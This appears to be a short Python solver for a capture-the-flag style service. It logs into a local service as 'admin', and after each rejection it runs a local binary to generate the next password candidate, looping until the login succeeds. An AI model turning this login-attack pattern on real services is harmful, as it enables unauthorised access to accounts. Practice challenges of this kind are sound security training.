import socket
import sys
import time
import subprocess

if __name__ == "__main__":
    sock = socket.socket()
    sock.connect(("127.0.0.1", 2339))
    sock.recv(100500)
    sock.send(b"admin\n")
    sock.recv(100500)
    password = "ZVwXtuORgXLfaLtBIqqDwCuD4MthWHTS"
    sock.send(password.encode())
    resp = sock.recv(100500).decode()[0:18]
    #print(resp)
    while resp == 'Incorrect password':
            proc = subprocess.Popen(["./build/oleg-service"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            proc.stdin.write(password.encode())
            password = proc.communicate()[0].decode()
            sock.send(b"admin\n")
            sock.recv(100500)
            sock.send(password.encode())
            new_pass = sock.recv(100500).decode()
            resp = new_pass[0:18]

    print(new_pass)
    sock.close()